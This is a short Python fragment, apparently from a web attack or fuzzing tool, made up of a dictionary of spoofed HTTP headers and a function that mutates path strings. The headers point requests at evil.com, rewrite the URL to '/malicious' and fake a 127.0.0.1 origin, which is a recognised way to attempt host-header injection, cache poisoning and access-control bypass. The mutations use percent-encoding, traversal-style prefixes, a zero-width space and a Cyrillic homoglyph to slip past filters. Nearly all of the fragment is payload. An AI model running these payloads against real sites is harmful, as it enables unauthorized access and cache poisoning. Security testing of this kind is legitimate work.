payload_headers = {
    "X-Forwarded-Host": "evil.com",
    "X-Host": "evil.com",
    "X-Original-URL": "/malicious",
    "X-Forwarded-Server": "evil.com",
    "X-Rewrite-URL": "/malicious",
    "X-Forwarded-For": "127.0.0.1",
    "Forwarded": "host=evil.com",
    "X-Custom-IP-Authorization": "127.0.0.1"
}

def generate_payload_mutations(base):
    mutations = set()

    mutations.add(base.replace('.', '%2e'))      
    mutations.add(base.replace('.', '..'))       
    mutations.add(base[:2] + '\u200b' + base[2:])
    mutations.add('/' + base)
    mutations.add('/./' + base)
    mutations.add('/%2e/' + base)
    mutations.add('//' + base)
    mutations.add(base.upper())
    mutations.add(base.capitalize())
    mutations.add(base.replace('e', 'е'))

    return list(mutations)
